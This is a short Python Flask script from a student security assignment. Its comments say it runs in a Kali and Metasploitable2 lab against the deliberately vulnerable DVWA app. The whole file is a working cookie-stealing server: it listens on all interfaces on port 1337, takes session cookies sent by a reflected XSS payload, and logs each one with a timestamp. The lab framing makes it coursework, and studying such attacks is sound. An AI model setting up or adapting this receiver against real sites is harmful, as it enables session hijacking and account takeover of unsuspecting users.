# Student name: Edward Wagstaffe
# UOW ID: -
# Flask app to capture cookies from DVWA  
# CSCI369 - Assignment (Task 2)
# Demonstrates reflected XSS exploitation with cookie exfiltration
# Machines used:
# - Kali Linux (Attacker)
# - Metasploitable2 (DVWA host)

from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/csci369task2')
def cookie_stealer():
    # Extract cookie from GET request
    cookie = request.args.get('cookie')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if cookie:
        # Append to file with timestamp for record keeping in cookies.txt 
        with open("cookies.txt", "a") as file:
            file.write(f"[{timestamp}] {cookie}\n")
        print(f"Cookie captured at {timestamp}: {cookie}") # print success message
        return "Cookie received"
    return "No cookie found" # print failed message if failed..

if __name__ == '__main__':
    # Bind to all interfaces so Meta2 VM can send requests
    app.run(host='0.0.0.0', port=1337)

